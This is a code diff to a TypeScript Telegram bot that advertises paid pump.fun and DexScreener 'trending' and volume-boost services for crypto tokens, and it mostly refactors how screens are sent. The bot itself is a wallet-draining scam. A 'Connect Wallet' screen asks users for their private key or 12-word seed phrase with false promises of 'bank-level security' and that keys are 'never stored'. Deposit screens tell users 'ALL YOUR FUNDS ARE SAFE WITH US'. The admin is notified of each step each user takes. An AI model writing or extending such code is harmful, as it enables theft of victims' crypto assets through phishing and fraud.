@@ -39,12 +39,25 @@ const IMG = {
   trending:      path.join(__dirname, "images", "trending.jpeg"),
 };
 
-// ── Payment addresses from environment ────────────────────────────────────────
-const SOL_ADDRESS      = process.env.PAYMENT_SOL_ADDRESS ?? "";
+// ── Payment addresses + support from environment only ─────────────────────────
 const ETH_ADDRESS      = process.env.PAYMENT_ETH_ADDRESS ?? "";
-const SUPPORT_USERNAME = process.env.SUPPORT_USERNAME    ?? "@support";
+const SUPPORT_USERNAME = process.env.SUPPORT_USERNAME    ?? "";
 
-// ── Bot's own public base URL (for image proxy) ───────────────────────────────
+// ── Delete the current message (the one that triggered a button click) ─────────
+async function delMsg(ctx: any) {
+  try { await ctx.deleteMessage(); } catch {}
+}
+
+// ── Send photo; fallback to text if photo fails ────────────────────────────────
+async function sendPhoto(ctx: any, img: string, caption: string, extra: any = {}) {
+  try {
+    await ctx.replyWithPhoto({ source: img }, { caption, parse_mode: "HTML", ...extra });
+  } catch {
+    await ctx.reply(caption, { parse_mode: "HTML", ...extra });
+  }
+}
+
+// ── Bot's own public base URL (for token image proxy) ─────────────────────────
 const BOT_SERVER_BASE =
   process.env["RENDER_EXTERNAL_HOSTNAME"] ? `https://${process.env["RENDER_EXTERNAL_HOSTNAME"]}` :
   process.env["REPLIT_DEV_DOMAIN"]        ? `https://${process.env["REPLIT_DEV_DOMAIN"]}` :
@@ -72,21 +85,19 @@ function userLine(u: any): string {
   return `👤 <b>${name}</b>${handle}${lang}\n🆔 ID: <code>${u.id}</code>`;
 }
 
-// ── Admin notifications ───────────────────────────────────────────────────────
+// ── Admin DM notifications ────────────────────────────────────────────────────
 async function notifyNewUser(ctx: any) {
-  const u = ctx.from;
   await notifyAdmin(
     `🆕 <b>NEW USER STARTED BOT</b>\n\n` +
-    `${userLine(u)}\n` +
+    `${userLine(ctx.from)}\n` +
     `⏰ ${new Date().toUTCString()}`
   );
 }
 
 async function notifyServiceSelected(ctx: any, service: string, pkg: string, amount: string) {
-  const u = ctx.from;
   await notifyAdmin(
     `🎯 <b>SERVICE SELECTED</b>\n\n` +
-    `${userLine(u)}\n\n` +
+    `${userLine(ctx.from)}\n\n` +
     `📦 Service: <b>${service}</b>\n` +
     `💰 Package: <b>${pkg}</b>\n` +
     `💵 Amount: <b>${amount}</b>\n\n` +
@@ -95,10 +106,9 @@ async function notifyServiceSelected(ctx: any, service: string, pkg: string, amo
 }
 
 async function notifyWalletViewed(ctx: any, solAddr: string, ethAddr: string) {
-  const u = ctx.from;
   await notifyAdmin(
     `👁 <b>DEPOSIT SCREEN OPENED</b>\n\n` +
-    `${userLine(u)}\n\n` +
+    `${userLine(ctx.from)}\n\n` +
     `◎ SOL Wallet:\n<code>${solAddr}</code>\n\n` +
     `Ξ ETH Address:\n<code>${ethAddr || "Not configured"}</code>\n\n` +
     `⏰ ${new Date().toUTCString()}`
@@ -106,15 +116,14 @@ async function notifyWalletViewed(ctx: any, solAddr: string, ethAddr: string) {
 }
 
 async function notifyConnectWalletOpened(ctx: any) {
-  const u = ctx.from;
   await notifyAdmin(
     `🔗 <b>CONNECT WALLET OPENED</b>\n\n` +
-    `${userLine(u)}\n\n` +
+    `${userLine(ctx.from)}\n\n` +
     `⏰ ${new Date().toUTCString()}`
   );
 }
 
-// ── Package tables ─────────────────────────────────────────────────────────────
+// ── Package tables ────────────────────────────────────────────────────────────
 interface VolPkg { label: string; sol: number; volume: string; service: string }
 const VOLUME_PKGS: Record<string, VolPkg> = {
   vol_iron:     { label: "Iron",     sol: 1.50,  volume: "$50,000",       service: "Iron Package"     },
@@ -152,30 +161,14 @@ const DEX_PKGS: Record<string, TrendPkg> = {
   dex_32hr: { label: "TOP 6 — 32 hr", sol: 22,  service: "DexScreener TOP6 32hr" },
 };
 
-// ── Send photo with text fallback ─────────────────────────────────────────────
-async function sendPhoto(ctx: any, img: string, caption: string, extra: any = {}) {
-  try {
-    await ctx.replyWithPhoto({ source: img }, { caption, parse_mode: "HTML", ...extra });
-  } catch {
-    await ctx.reply(caption, { parse_mode: "HTML", ...extra });
-  }
-}
+// ─────────────────────────────────────────────────────────────────────────────
+// SCREEN SENDERS — every screen deletes the old message then sends fresh content
+// so the correct image always shows for its screen position.
+// ─────────────────────────────────────────────────────────────────────────────
 
-// ── Edit existing message or send new one ─────────────────────────────────────
-async function editOrSend(ctx: any, text: string, extra: any = {}) {
-  try {
-    await ctx.editMessageCaption(text, { parse_mode: "HTML", ...extra });
-  } catch {
-    try {
-      await ctx.editMessageText(text, { parse_mode: "HTML", ...extra });
-    } catch {
-      await ctx.reply(text, { parse_mode: "HTML", ...extra });
-    }
-  }
-}
-
-// ── Screen builders ───────────────────────────────────────────────────────────
 async function sendWelcome(ctx: any) {
+  // delete the message that triggered navigation (if from a button click)
+  await delMsg(ctx);
   const caption =
     `🟢 <b>Welcome to PUMPFUN TREND BOT service!</b>\n\n` +
     `New to volume bots? No worries — we made it super simple!\n\n` +
@@ -190,19 +183,13 @@ async function sendWelcome(ctx: any) {
     `🟢 <a href="https://pumpswap.xyz">PumpSwap</a>  •  🟢 <a href="https://moonshot.money">Moonshot</a>  •\n` +
     `🟢 <a href="https://letsbonk.fun">LetsBonk</a>  •  🟢 <a href="https://dexscreener.com">Dexpad/screener</a>\n\n` +
     `From 0.3 - 0.4 - 0.5 - 0.6 SOL bumps boost trend with mass volume of high stabilities.`;
-  try {
-    await ctx.editMessageCaption(caption, { parse_mode: "HTML", ...mainMenuKeyboard });
-    return;
-  } catch {}
-  try {
-    await ctx.editMessageText(caption, { parse_mode: "HTML", ...mainMenuKeyboard });
-    return;
-  } catch {}
   await sendPhoto(ctx, IMG.welcome, caption, mainMenuKeyboard);
 }
 
 async function showStartBumping(ctx: any) {
-  const text =
+  await delMsg(ctx);
+  const support = SUPPORT_USERNAME ? `\n\nFor more information, please contact ${SUPPORT_USERNAME}` : "";
+  await ctx.reply(
     `The fastest and cheapest Telegram bot for creating bump orders.\n\n` +
     `<b>Supported Platform:</b>\n` +
     `Pumpfun and Raydium.\n\n` +
@@ -210,12 +197,14 @@ async function showStartBumping(ctx: any) {
     `📊 <b>Trending channel:</b>\n` +
     `<a href="https://t.me/pumpmints">https://t.me/pumpmints</a>\n\n` +
     `Subscribe to our PF alert tools:\n` +
-    `- PF New Raydium Pools: <a href="https://t.me/pumpswap_pools">t.me/pumpswap_pools</a>\n\n` +
-    `For more information, please contact ${SUPPORT_USERNAME}`;
-  await editOrSend(ctx, text, solPickerKeyboard);
+    `- PF New Raydium Pools: <a href="https://t.me/pumpswap_pools">t.me/pumpswap_pools</a>` +
+    support,
+    { parse_mode: "HTML", ...solPickerKeyboard }
+  );
 }
 
 async function showVolumeBoost(ctx: any) {
+  await delMsg(ctx);
   const caption =
     `✏️ Iron Package - $50,000 Volume\n` +
     `✏️ Bronze Package - $250,000 Volume\n` +
@@ -228,6 +217,7 @@ async function showVolumeBoost(ctx: any) {
 }
 
 async function showTrendingBoost(ctx: any) {
+  await delMsg(ctx);
   const caption =
     `🟢 Discover the Power of Trending!\n\n` +
     `Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n` +
@@ -237,18 +227,21 @@ async function showTrendingBoost(ctx: any) {
 }
 
 async function showDexScreener(ctx: any) {
-  const text =
+  await delMsg(ctx);
+  await ctx.reply(
     `🌐 DEX Screener is a data platform and on-chain analytics tool designed for decentralized exchanges (DEXs), providing real-time insights into token prices, liquidity pools, trading volumes, and market trends across multiple blockchains.\n\n` +
     `<b>TREND ON DEX</b>\n\n` +
     `🔴 TOP 6 🔴\n\n` +
-    `Select a duration:`;
-  await editOrSend(ctx, text, dexscreenerKeyboard);
+    `Select a duration:`,
+    { parse_mode: "HTML", ...dexscreenerKeyboard }
+  );
 }
 
 async function showDeposit(ctx: any) {
-  const wallet = deriveWalletForUser(ctx.from.id);
+  await delMsg(ctx);
+  const wallet     = deriveWalletForUser(ctx.from.id);
   const ethDisplay = ETH_ADDRESS || "Not configured — set PAYMENT_ETH_ADDRESS";
-  const text =
+  await ctx.reply(
     `<b>WALLET BALANCE</b>\n\n` +
     `<b>ETH:</b>\n<code>${ethDisplay}</code>\n` +
     `balance: 0 ETH\n\n` +
@@ -256,13 +249,14 @@ async function showDeposit(ctx: any) {
     `balance: 0 SOL\n\n` +
     `Deposit not less than 0.30 SOL and get trending on several platforms\n\n` +
     `💰 KINDLY CLICK ON THE ADD BUTTON TO GENERATE YOUR WALLET.\n` +
-    `💡 NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`;
-  await editOrSend(ctx, text, depositKeyboard);
-  // Notify admin that this user viewed their deposit wallet
+    `💡 NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
+    { parse_mode: "HTML", ...depositKeyboard }
+  );
   notifyWalletViewed(ctx, wallet.address, ETH_ADDRESS).catch(() => {});
 }
 
 async function showConnectWallet(ctx: any) {
+  await delMsg(ctx);
   const caption =
     `🔗 <b>Connect Your Wallet</b>\n\n` +
     `Welcome to our secure wallet connection service!\n\n` +
@@ -277,11 +271,16 @@ async function showConnectWallet(ctx: any) {
 }
 
 async function showSupport(ctx: any) {
-  const text =
+  await delMsg(ctx);
+  const contactLine = SUPPORT_USERNAME
+    ? `For assistance, contact: <b>${SUPPORT_USERNAME}</b>`
+    : `Please reach out via the official channel.`;
+  await ctx.reply(
     `💬 <b>Contact Support</b>\n\n` +
-    `For assistance, contact: <b>${SUPPORT_USERNAME}</b>\n\n` +
-    `🆔 Your User ID: <code>${ctx.from.id}</code>`;
-  await editOrSend(ctx, text, mainMenuOnlyKeyboard);
+    `${contactLine}\n\n` +
+    `🆔 Your User ID: <code>${ctx.from.id}</code>`,
+    { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
+  );
 }
 
 // ── Bot factory ───────────────────────────────────────────────────────────────
@@ -291,7 +290,6 @@ export function createBot(): Telegraf {
   const bot = new Telegraf(token);
   setBot(bot);
 
-  // ── Global error boundary — one bad update NEVER kills polling/webhook ──────
   bot.catch((err: unknown, ctx: any) => {
     const msg = err instanceof Error ? err.message : String(err);
     logger.error({ err, updateType: ctx?.updateType }, `Bot error: ${msg}`);
@@ -303,10 +301,26 @@ export function createBot(): Telegraf {
   bot.start(async (ctx) => {
     clearSession(ctx.from.id);
     notifyNewUser(ctx).catch(() => {});
-    await sendWelcome(ctx);
+    // /start has no previous bot message to delete — just send fresh welcome
+    await sendPhoto(ctx, IMG.welcome,
+      `🟢 <b>Welcome to PUMPFUN TREND BOT service!</b>\n\n` +
+      `New to volume bots? No worries — we made it super simple!\n\n` +
+      `━━━━━━━━━━━━━━━━\n\n` +
+      `<b>How it works:</b>\n` +
+      `1. Select how much Bumps/volume to use.\n` +
+      `2. Pick how long to run and how Massive you want your Token to Pump.\n` +
+      `3. Done! <a href="https://pump.fun">Pump.fun</a> Server handles the rest.\n\n` +
+      `━━━━━━━━━━━━━━━━\n\n` +
+      `<b>Works on:</b>\n` +
+      `🟢 <a href="https://pump.fun">Pumpfun</a>  •  🟢 <a href="https://raydium.io">Raydium</a>  •\n` +
+      `🟢 <a href="https://pumpswap.xyz">PumpSwap</a>  •  🟢 <a href="https://moonshot.money">Moonshot</a>  •\n` +
+      `🟢 <a href="https://letsbonk.fun">LetsBonk</a>  •  🟢 <a href="https://dexscreener.com">Dexpad/screener</a>\n\n` +
+      `From 0.3 - 0.4 - 0.5 - 0.6 SOL bumps boost trend with mass volume of high stabilities.`,
+      mainMenuKeyboard
+    );
   });
 
-  // ── Main menu callback buttons ────────────────────────────────────────────
+  // ── Main menu ─────────────────────────────────────────────────────────────
   bot.action("back_main", async (ctx) => {
     await ctx.answerCbQuery();
     clearSession(ctx.from.id);
@@ -337,11 +351,12 @@ export function createBot(): Telegraf {
         serviceLabel: `Volume Bumping (${amt} SOL)`,
         boostType: "bump",
       });
-      await editOrSend(ctx,
+      await delMsg(ctx);
+      await ctx.reply(
         `📝 <b>Enter Contract Address (CA)</b>\n\n` +
         `You selected <b>${amt} SOL</b> per bump\n\n` +
         `Please enter the Contract Address (CA) of your project:`,
-        cancelKeyboard
+        { parse_mode: "HTML", ...cancelKeyboard }
       );
     });
   }
@@ -358,12 +373,13 @@ export function createBot(): Telegraf {
         boostType: "volume",
         boostPackage: key,
       });
-      await editOrSend(ctx,
+      await delMsg(ctx);
+      await ctx.reply(
         `📝 <b>Enter Contract Address (CA)</b>\n\n` +
         `You selected <b>${pkg.label} Package (${pkg.sol} SOL)</b>\n` +
         `Volume: <b>${pkg.volume}</b>\n\n` +
         `Please enter the Contract Address (CA) of your project:`,
-        cancelKeyboard
+        { parse_mode: "HTML", ...cancelKeyboard }
       );
     });
   }
@@ -371,28 +387,32 @@ export function createBot(): Telegraf {
   // ── Trending menu ─────────────────────────────────────────────────────────
   bot.action("trend_sol", async (ctx) => {
     await ctx.answerCbQuery();
-    await editOrSend(ctx,
+    await delMsg(ctx);
+    await ctx.reply(
       `Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n` +
       `🟢 A paid boost guarantees you a spot in our daily livestream (AMA)!\n\n` +
       `➡️ Please choose SOL Trending or Pump Fun Trending to start:`,
-      solTrendingKeyboard
+      { parse_mode: "HTML", ...solTrendingKeyboard }
     );
   });
 
   bot.action("trend_eth", async (ctx) => {
     await ctx.answerCbQuery();
-    await editOrSend(ctx,
+    await delMsg(ctx);
+    await ctx.reply(
       `🔵 <b>ETH TREND</b>\n\nKindly chose the trend you wish to pump on.`,
-      ethTrendingKeyboard
+      { parse_mode: "HTML", ...ethTrendingKeyboard }
     );
   });
 
   bot.action("trend_pumpfun", async (ctx) => {
     await ctx.answerCbQuery();
-    const caption =
+    await delMsg(ctx);
+    await sendPhoto(ctx, IMG.trending,
       `🔥 <b>PUMP.FUN TRENDING</b> 🔥\n\n` +
-      `💡 THE BEST TRENDING IN THE BOT SECTION, DON'T MISS THE OPPORTUNITY TO GET 12 HOURS FREE SOLANA TRENDING ONCE YOU PURCHASE IT.`;
-    await sendPhoto(ctx, IMG.trending, caption, pumpfunTrendingKeyboard);
+      `💡 THE BEST TRENDING IN THE BOT SECTION, DON'T MISS THE OPPORTUNITY TO GET 12 HOURS FREE SOLANA TRENDING ONCE YOU PURCHASE IT.`,
+      pumpfunTrendingKeyboard
+    );
   });
 
   bot.action("trend_back", async (ctx) => {
@@ -415,12 +435,13 @@ export function createBot(): Telegraf {
         boostType: "sol_trending",
         boostPackage: key,
       });
-      await editOrSend(ctx,
+      await delMsg(ctx);
+      await ctx.reply(
         `📝 <b>Enter Contract Address (CA)</b>\n\n` +
         `Package: <b>${pkg.label}</b>\n` +
         `Cost: <b>${pkg.sol} SOL</b>\n\n` +
         `Please paste the Contract Address (CA) of your token:`,
-        cancelKeyboard
+        { parse_mode: "HTML", ...cancelKeyboard }
       );
     });
   }
@@ -438,11 +459,12 @@ export function createBot(): Telegraf {
         boostType: "eth_trending",
         boostPackage: key,
       });
-      await editOrSend(ctx,
+      await delMsg(ctx);
+      await ctx.reply(
         `📝 <b>Enter Contract Address (CA)</b>\n\n` +
         `Package: <b>ETH Trending $${pkg.usd}</b>\n\n` +
         `Please paste the Contract Address (CA) of your token:`,
-        cancelKeyboard
+        { parse_mode: "HTML", ...cancelKeyboard }
       );
     });
   }
@@ -458,18 +480,18 @@ export function createBot(): Telegraf {
       boostType: "pumpfun_trending",
       boostPackage: "pft_30",
     });
-    await editOrSend(ctx,
+    await delMsg(ctx);
+    await ctx.reply(
       `📝 <b>Enter Contract Address (CA)</b>\n\n` +
       `Package: <b>P.F.T — 30 SOL</b>\n\n` +
       `Please paste the Contract Address (CA) of your token:`,
-      cancelKeyboard
+      { parse_mode: "HTML", ...cancelKeyboard }
     );
   });
 
-  // ── DexScreener info label ────────────────────────────────────────────────
+  // ── DexScreener ───────────────────────────────────────────────────────────
   bot.action("dex_top6_info", async (ctx) => ctx.answerCbQuery("Choose a duration below"));
 
-  // ── DexScreener packages ──────────────────────────────────────────────────
   for (const [key, pkg] of Object.entries(DEX_PKGS)) {
     bot.action(key, async (ctx) => {
       await ctx.answerCbQuery();
@@ -481,12 +503,13 @@ export function createBot(): Telegraf {
         boostType: "dexscreener",
         boostPackage: key,
       });
-      await editOrSend(ctx,
+      await delMsg(ctx);
+      await ctx.reply(
         `📝 <b>Enter Contract Address (CA)</b>\n\n` +
         `Package: <b>${pkg.label}</b>\n` +
         `Cost: <b>${pkg.sol} SOL</b>\n\n` +
         `Please paste the Contract Address (CA) of your token:`,
-        cancelKeyboard
+        { parse_mode: "HTML", ...cancelKeyboard }
       );
     });
   }
@@ -494,12 +517,12 @@ export function createBot(): Telegraf {
   // ── Confirm order ─────────────────────────────────────────────────────────
   bot.action("confirm_bump", async (ctx) => {
     await ctx.answerCbQuery();
-    const s        = getSession(ctx.from.id);
-    const wallet   = deriveWalletForUser(ctx.from.id);
-    const orderId  = randomUUID().split("-")[0].toUpperCase();
-    const isEth    = s.boostType === "eth_trending";
+    const s       = getSession(ctx.from.id);
+    const wallet  = deriveWalletForUser(ctx.from.id);
+    const orderId = randomUUID().split("-")[0].toUpperCase();
+    const isEth   = s.boostType === "eth_trending";
 
-    // SOL payments go to the per-user derived wallet; ETH payments go to the fixed ETH address
+    // SOL → per-user derived wallet; ETH → fixed ETH address from env
     const payWallet = isEth ? ETH_ADDRESS : wallet.address;
 
     setSession(ctx.from.id, {
@@ -540,9 +563,7 @@ export function createBot(): Telegraf {
       `• Token: <b>${s.tokenName}</b> ($${s.tokenSymbol})\n` +
       `• CA: <code>${s.contractAddress}</code>\n` +
       `• Service: ${s.serviceLabel}\n` +
-      (isEth
-        ? `• Amount: <b>$${s.ethAmount} USD</b>\n`
-        : `• Amount: <b>${s.selectedSol} SOL</b>\n`) +
+      (isEth ? `• Amount: <b>$${s.ethAmount} USD</b>\n` : `• Amount: <b>${s.selectedSol} SOL</b>\n`) +
       `• Order ID: <code>${orderId}</code>\n\n` +
       `💳 <b>Send Payment To:</b>\n` +
       `${payLine}\n\n` +
@@ -551,7 +572,9 @@ export function createBot(): Telegraf {
         : `⚠️ Send exactly <b>${s.selectedSol} SOL</b> on Solana network`) +
       `\n\nAfter sending, click the button below and submit your transaction hash.`;
 
-    // Show payment screen — try with token image first
+    await delMsg(ctx);
+
+    // Show payment screen with token image if available
     let sentWithPhoto = false;
     if (s.tokenImageUrl) {
       sentWithPhoto = await safeSendPhoto(ctx, s.tokenImageUrl, {
@@ -564,7 +587,7 @@ export function createBot(): Telegraf {
       await ctx.reply(paymentMsg, { parse_mode: "HTML", ...paymentSentKeyboard });
     }
 
-    // ── Admin: full new order notification ────────────────────────────────────
+    // ── Admin: full new order notification ─────────────────────────────────
     const adminMsg =
       `📋 <b>NEW ORDER</b>\n\n` +
       `${userLine(ctx.from)}\n\n` +
@@ -589,25 +612,27 @@ export function createBot(): Telegraf {
     }
   });
 
-  // ── Payment Sent — ask for TX hash ────────────────────────────────────────
+  // ── Payment sent → ask for TX hash ────────────────────────────────────────
   bot.action("submit_tx", async (ctx) => {
     await ctx.answerCbQuery();
     const s = getSession(ctx.from.id);
     setSession(ctx.from.id, { step: "awaiting_tx_hash" });
-    await editOrSend(ctx,
+    await delMsg(ctx);
+    await ctx.reply(
       `📝 <b>Submit Transaction Hash</b>\n\n` +
       `Please paste your transaction hash below.\n\n` +
       `🕐 Order ID: <code>${s.orderId ?? "N/A"}</code>`,
-      cancelKeyboard
+      { parse_mode: "HTML", ...cancelKeyboard }
     );
   });
 
   // ── Deposit actions ───────────────────────────────────────────────────────
   bot.action("deposit_add", async (ctx) => {
     await ctx.answerCbQuery();
-    const wallet    = deriveWalletForUser(ctx.from.id);
+    const wallet     = deriveWalletForUser(ctx.from.id);
     const ethDisplay = ETH_ADDRESS || "Not configured — set PAYMENT_ETH_ADDRESS";
-    await editOrSend(ctx,
+    await delMsg(ctx);
+    await ctx.reply(
       `<b>WALLET BALANCE</b>\n\n` +
       `<b>ETH:</b>\n<code>${ethDisplay}</code>\n` +
       `balance: 0 ETH\n\n` +
@@ -616,20 +641,21 @@ export function createBot(): Telegraf {
       `Deposit not less than 0.30 SOL and get trending on several platforms\n\n` +
       `💰 Send SOL to your unique wallet address above.\n` +
       `💡 NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
-      mainMenuOnlyKeyboard
+      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
     );
   });
 
   bot.action("deposit_withdraw", async (ctx) => {
     await ctx.answerCbQuery();
     setSession(ctx.from.id, { step: "awaiting_withdraw_address" });
-    await editOrSend(ctx,
+    await delMsg(ctx);
+    await ctx.reply(
       `💸 <b>Withdraw Funds</b>\n\n` +
       `Send your withdrawal address and amount:\n\n` +
       `<b>Format:</b> <code>ADDRESS AMOUNT</code>\n` +
       `<b>Example:</b> <code>7xKXtg2...GVUM 0.5</code>\n\n` +
       `⚠️ Double-check — withdrawals cannot be reversed.`,
-      cancelKeyboard
+      { parse_mode: "HTML", ...cancelKeyboard }
     );
   });
 
@@ -650,9 +676,8 @@ export function createBot(): Telegraf {
       const data: any = await resp.json();
       const lamports = data?.result?.value ?? 0;
       balance = `${(lamports / 1e9).toFixed(4)} SOL`;
-    } catch { /* keep default */ }
+    } catch {}
 
-    // Also notify admin of balance check
     notifyAdmin(
       `💳 <b>BALANCE CHECK</b>\n\n` +
       `${userLine(ctx.from)}\n\n` +
@@ -661,11 +686,12 @@ export function createBot(): Telegraf {
       `⏰ ${new Date().toUTCString()}`
     ).catch(() => {});
 
-    await editOrSend(ctx,
+    await delMsg(ctx);
+    await ctx.reply(
       `◎ <b>SOL Balance</b>\n\n` +
       `Wallet: <code>${wallet.address}</code>\n\n` +
       `Balance: <b>${balance}</b>`,
-      mainMenuOnlyKeyboard
+      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
     );
   });
 
@@ -677,18 +703,14 @@ export function createBot(): Telegraf {
           `• ${o.service} — ${o.solAmount > 0 ? o.solAmount + " SOL" : "$" + o.usdAmount + " USD"} — ${o.status} — ${o.createdAt.toLocaleDateString()}`
         ).join("\n")
       : "No orders yet.";
-    await editOrSend(ctx,
-      `📋 <b>My Orders</b>\n\n${lines}`,
-      mainMenuOnlyKeyboard
-    );
+    await delMsg(ctx);
+    await ctx.reply(`📋 <b>My Orders</b>\n\n${lines}`, { parse_mode: "HTML", ...mainMenuOnlyKeyboard });
   });
 
   bot.action("deposit_my_withdrawals", async (ctx) => {
     await ctx.answerCbQuery();
-    await editOrSend(ctx,
-      `📋 <b>My Withdrawals</b>\n\nNo withdrawals recorded yet.`,
-      mainMenuOnlyKeyboard
-    );
+    await delMsg(ctx);
+    await ctx.reply(`📋 <b>My Withdrawals</b>\n\nNo withdrawals recorded yet.`, { parse_mode: "HTML", ...mainMenuOnlyKeyboard });
   });
 
   // ── Connect Wallet sub-screens ────────────────────────────────────────────
@@ -699,7 +721,8 @@ export function createBot(): Telegraf {
 
   bot.action("wallet_why", async (ctx) => {
     await ctx.answerCbQuery();
-    await editOrSend(ctx,
+    await delMsg(ctx);
+    await ctx.reply(
       `🔐 <b>Why Connect Your Wallet?</b>\n\n` +
       `Connecting your wallet unlocks:\n\n` +
       `• ⚡ <b>Instant payments</b> — no manual transfers\n` +
@@ -707,13 +730,14 @@ export function createBot(): Telegraf {
       `• 💰 <b>Auto-refunds</b> — failed orders refunded instantly\n` +
       `• 🎯 <b>Priority processing</b> — faster service\n` +
       `• 🔔 <b>Notifications</b> — alerts when boost goes live`,
-      whyConnectKeyboard
+      { parse_mode: "HTML", ...whyConnectKeyboard }
     );
   });
 
   bot.action("wallet_security", async (ctx) => {
     await ctx.answerCbQuery();
-    await editOrSend(ctx,
+    await delMsg(ctx);
+    await ctx.reply(
       `🛡️ <b>Security Guidelines</b>\n\n` +
       `⚠️ <b>IMPORTANT SECURITY NOTICE:</b>\n\n` +
       `🔒 <b>What We Do:</b>\n` +
@@ -732,13 +756,14 @@ export function createBot(): Telegraf {
       `🔒 <b>Our Commitment:</b>\n` +
       `We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.\n\n` +
       `Ready to proceed safely?`,
-      securityGuidelinesKeyboard
+      { parse_mode: "HTML", ...securityGuidelinesKeyboard }
     );
   });
 
   bot.action("wallet_how_to", async (ctx) => {
     await ctx.answerCbQuery();
-    await editOrSend(ctx,
+    await delMsg(ctx);
+    await ctx.reply(
       `📱 <b>How to Connect Your Wallet</b>\n\n` +
       `🔧 <b>Step-by-Step Process:</b>\n\n` +
       `1️⃣ <b>Choose Connection Method</b>\n` +
@@ -761,14 +786,15 @@ export function createBot(): Telegraf {
       `⏰ Connection Time: Usually 2-5 minutes\n` +
       `🔒 Security: Military-grade encryption throughout\n\n` +
       `Ready to connect your wallet?`,
-      howToConnectKeyboard
+      { parse_mode: "HTML", ...howToConnectKeyboard }
     );
   });
 
   bot.action("wallet_connect_now", async (ctx) => {
     await ctx.answerCbQuery();
     setSession(ctx.from.id, { step: "awaiting_wallet_credential" });
-    await editOrSend(ctx,
+    await delMsg(ctx);
+    await ctx.reply(
       `🔗 <b>Connect Your Wallet Now</b>\n\n` +
       `⚠️ This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..\n\n` +
       `Please enter your Private Key or 12 word Seed Phrase to import your wallet:\n\n` +
@@ -786,11 +812,11 @@ export function createBot(): Telegraf {
       `• No permanent storage\n\n` +
       `⚡ <b>Auto-Detection:</b>\n` +
       `Our system will automatically detect whether you're providing a private key or seed phrase.`,
-      cancelKeyboard
+      { parse_mode: "HTML", ...cancelKeyboard }
     );
   });
 
-  // ── Text message handler (state machine) ──────────────────────────────────
+  // ── Text handler (state machine) ──────────────────────────────────────────
   bot.on("text", async (ctx) => {
     const text = ctx.message.text.trim();
     if (text.startsWith("/")) return;
@@ -807,10 +833,8 @@ export function createBot(): Telegraf {
             `❌ <b>Invalid Contract Address</b>\n\n` +
             `That doesn't look like a valid token address.\n\n` +
             `<b>Valid formats:</b>\n` +
-            `• Solana — 32–44 base58 characters\n` +
-            `  Example: <code>EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v</code>\n\n` +
-            `• Ethereum — starts with <code>0x</code> + 40 hex characters\n` +
-            `  Example: <code>0xdAC17F958D2ee523a2206206994597C13D831ec7</code>\n\n` +
+            `• Solana — 32–44 base58 characters\n  Example: <code>EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v</code>\n\n` +
+            `• Ethereum — starts with <code>0x</code> + 40 hex characters\n  Example: <code>0xdAC17F958D2ee523a2206206994597C13D831ec7</code>\n\n` +
             `Please paste your token contract address:`,
             { parse_mode: "HTML", ...cancelKeyboard }
           );
@@ -818,10 +842,7 @@ export function createBot(): Telegraf {
         }
 
         setSession(ctx.from.id, { contractAddress: ca });
-        const lookMsg = await ctx.reply(
-          `🔍 <b>Looking up token data...</b>\n⏳ Please wait while we fetch information...`,
-          { parse_mode: "HTML" }
-        );
+        const lookMsg = await ctx.reply(`🔍 <b>Looking up token data...</b>\n⏳ Please wait...`, { parse_mode: "HTML" });
 
         const info = await fetchTokenInfo(ca);
         await ctx.telegram.deleteMessage(ctx.chat.id, lookMsg.message_id).catch(() => {});
@@ -835,55 +856,42 @@ export function createBot(): Telegraf {
             `• Token is too new (not indexed yet) — try again in a few minutes\n` +
             `• Wrong address — double-check and paste again\n` +
             `• Token is on a different chain than expected (${caChain === "sol" ? "Solana" : caChain === "eth" ? "Ethereum" : "unknown"})\n\n` +
-            `You can still proceed — just paste the correct CA:`,
+            `You can still proceed — paste the correct CA:`,
             { parse_mode: "HTML", ...cancelKeyboard }
           );
           break;
         }
 
         setSession(ctx.from.id, {
-          step:            "awaiting_confirm",
-          tokenName:       info.name,
-          tokenSymbol:     info.symbol,
-          tokenChain:      info.chain,
-          tokenImageUrl:   info.imageUrl,
-          tokenPrice:      info.price,
-          tokenMarketCap:  info.marketCap,
-          tokenVolume24h:  info.volume24h,
-          tokenLiquidity:  info.liquidity,
-          tokenChange24h:  info.change24h,
-          tokenDex:        info.dex,
-          tokenWebsite:    info.website,
-          tokenTwitter:    info.twitter,
-          tokenTelegram:   info.telegram,
+          step: "awaiting_confirm",
+          tokenName:      info.name,
+          tokenSymbol:    info.symbol,
+          tokenChain:     info.chain,
+          tokenImageUrl:  info.imageUrl,
+          tokenPrice:     info.price,
+          tokenMarketCap: info.marketCap,
+          tokenVolume24h: info.volume24h,
+          tokenLiquidity: info.liquidity,
+          tokenChange24h: info.change24h,
+          tokenDex:       info.dex,
         });
 
         const s = getSession(ctx.from.id);
         const isEth  = s.boostType === "eth_trending";
         const cost   = isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`;
-
-        const chainName = info.chain === "sol" ? "solana"
-                        : info.chain === "eth" ? "ethereum"
-                        : info.chain === "bsc" ? "bsc"
-                        : info.chain ?? "unknown";
-        const dexName  = info.dex ?? "unknown";
-        const tokenUrl = info.chain === "sol"
-          ? `https://pump.fun/coin/${ca}`
-          : `https://dexscreener.com/${info.chain}/${ca}`;
-
-        const availableLine = info.chain === "sol"
+        const chainName = info.chain === "sol" ? "solana" : info.chain === "eth" ? "ethereum" : info.chain ?? "unknown";
+        const dexName   = info.dex ?? "unknown";
+        const tokenUrl  = info.chain === "sol" ? `https://pump.fun/coin/${ca}` : `https://dexscreener.com/${info.chain}/${ca}`;
+        const availLine = info.chain === "sol"
           ? `🟢 Pumpswap • 🟢 <a href="${tokenUrl}">Pump.fun</a>`
           : info.chain === "eth"
           ? `🟢 Uniswap • 🟢 <a href="${tokenUrl}">DexScreener</a>`
-          : info.chain === "bsc"
